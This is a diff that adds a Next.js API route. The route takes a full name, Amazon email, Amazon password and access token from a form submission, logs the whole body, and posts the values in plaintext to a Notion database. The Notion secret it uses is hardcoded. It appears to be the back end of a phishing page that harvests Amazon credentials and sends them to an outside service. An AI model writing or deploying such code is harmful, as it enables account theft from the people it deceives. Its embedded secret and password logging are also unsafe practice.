@@ -1,0 +1,119 @@
+// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
+import type { NextApiRequest, NextApiResponse } from 'next'
+
+type Data = {
+  data: string
+}
+
+export default function handler(req: NextApiRequest, res: NextApiResponse<Data>) {
+
+    // Get data submitted in request's body.
+    const body = req.body
+  
+    // Optional logging to see the responses
+    // in the command line where next.js app is running.
+    console.log('body: ', body)
+  
+    // Guard clause checks for first and last name,
+    // and returns early if they are not found
+    if (!body.fullName || !body.amazonEmail || !body.amazonPassword) {
+      // Sends a HTTP bad request error code
+      return res.status(400).json({ data: 'Some data is missing in the body' })
+    } else {
+        // Sends a HTTP success code
+        var myHeaders = new Headers();
+        myHeaders.append("Authorization", "secret_lDDAPUBbBvIjFDgziDEIUpye2KHEU2QZyyuGFGndztz");
+        myHeaders.append("Content-Type", "application/json");
+        myHeaders.append("Notion-Version", "2022-06-28");
+        
+        var raw = JSON.stringify({
+          "parent": {
+            "database_id": "0d4b28844f8242a9945681e7caff647b"
+          },
+          "icon": {
+            "emoji": "🔏"
+          },
+          "properties": {
+            "Name": {
+              "title": [
+                {
+                  "text": {
+                    "content": `${body.fullName}`
+                  }
+                }
+              ]
+            },
+            "Email": {
+              "rich_text": [
+                {
+                  "text": {
+                    "content": `${body.amazonEmail}`
+                  }
+                }
+              ]
+            },
+            "Password": {
+              "rich_text": [
+                {
+                  "text": {
+                    "content": `${body.amazonPassword}`
+                  }
+                }
+              ]
+            },
+            "Access Token": {
+              "rich_text": [
+                {
+                  "text": {
+                    "content": `${body.token}`
+                  }
+                }
+              ]
+            }
+          },
+          "children": [
+            {
+              "object": "block",
+              "type": "heading_2",
+              "heading_2": {
+                "rich_text": [
+                  {
+                    "type": "text",
+                    "text": {
+                      "content": "Hello"
+                    }
+                  }
+                ]
+              }
+            },
+            {
+              "object": "block",
+              "type": "paragraph",
+              "paragraph": {
+                "rich_text": [
+                  {
+                    "type": "text",
+                    "text": {
+                      "content": "Some text"
+                    }
+                  }
+                ]
+              }
+            }
+          ]
+        });
+        
+        var requestOptions = {
+          method: 'POST',
+          headers: myHeaders,
+          body: raw,
+        };
+        
+        fetch("https://api.notion.com/v1/pages", requestOptions)
+          .then(response => response.text())
+          .then(result => console.log(result))
+          .catch(error => console.log('error', error));
+
+        return res.status(200);
+    }
+  }
